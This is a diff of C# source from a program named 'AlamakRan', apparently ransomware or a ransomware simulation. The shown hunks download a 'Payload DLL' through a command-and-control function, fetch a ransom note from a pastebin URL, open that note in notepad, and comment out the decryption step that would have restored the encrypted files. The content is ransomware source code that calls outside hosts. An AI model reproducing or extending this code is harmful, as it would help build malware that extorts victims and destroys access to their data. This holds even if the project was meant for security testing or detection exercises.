@@ -143,7 +143,7 @@ namespace AlamakRan
         static void RansomNoteDownload(string ransomNote)
         {
             WebClient client = new WebClient();
-            const string pastebin_url = "https://pastebin.com/dl/eu7zGAUL";
+            const string pastebin_url = "https://pastebin.com/dl/uDbAK17v";
             client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
             client.Headers.Add("referer", "https://pastebin.com");
             client.DownloadFile(pastebin_url, ransomNote);
@@ -174,7 +174,7 @@ namespace AlamakRan
 
             Console.WriteLine("Downloading Payload DLL");
             string downFile = C2Download(tempDirPath);
-            
+
             File.Move(downFile, tempDirPath + @"\" + newFilename);
             try
             {
@@ -196,11 +196,16 @@ namespace AlamakRan
 
             Console.WriteLine("Downloading ransom note from pastebin.");
             RansomNoteDownload(ransomNote);
-            
+
             Process.Start("notepad.exe", ransomNote);
 
-            Console.WriteLine("Time for you to check your logs.");
-
+            //--------------------------------------------------------------------------------------------------------------
+            //Console.WriteLine("Starting decryption process");
+            //foreach (string file in files)
+            //{
+            //    FileDecrypt(file, targetDirPath + "\\Decrypted.txt", randomPassword);
+            //    File.Delete(file);
+            //}
         }
     }
 }
